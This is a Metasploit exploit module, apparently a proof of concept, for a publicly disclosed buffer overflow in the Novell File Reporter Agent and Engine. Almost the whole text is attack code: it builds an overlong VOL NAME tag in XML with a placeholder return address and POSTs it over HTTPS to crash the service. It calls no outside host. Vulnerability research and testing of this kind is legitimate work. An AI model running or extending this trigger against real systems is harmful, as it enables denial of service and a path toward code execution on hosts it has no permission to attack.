require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell File Reporter Engine VOL PoC',
			'Description'    => %q{
					This module is simply a trigger for the Novell File Reporter
				Engine VOL tag buffer overflow. This will all trigger the same issue
				if ran against the NFRAgent.
			},
			'Author'         => [ 'Mario Ceballos' ],
			'License'        => 'BSD_LICENSE',
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-167/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'NFR Agent 1.0.3.22', { 'Ret' => 0x41414141 } ], 
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 27 2012'))

		register_options( 
			[ 
				Opt::RPORT(3037), # Agent port; set RPORT 3035 when attacking the Engine service.
				OptBool.new('SSL',   [true, 'Use SSL', true]),
			 ], self.class )
	end

	def exploit

		trigger =  pattern_create(22024) 
		trigger[96, 8] = [target.ret].pack('V') * 2

		xml = rand_text_alpha_upper(32) + "<VOL><NAME>#{trigger}</NAME><FSPACE></FSPACE></VOL>"
		
		print_status("Trying target #{target.name}...")

		res = send_request_cgi(
			{
				'uri'		=> '/',
				'method'	=> 'POST',
				'version'	=> '1.1',
				'ctype'		=> 'text/xml',
				'data'		=> xml
			}, 5)
		
	end

end
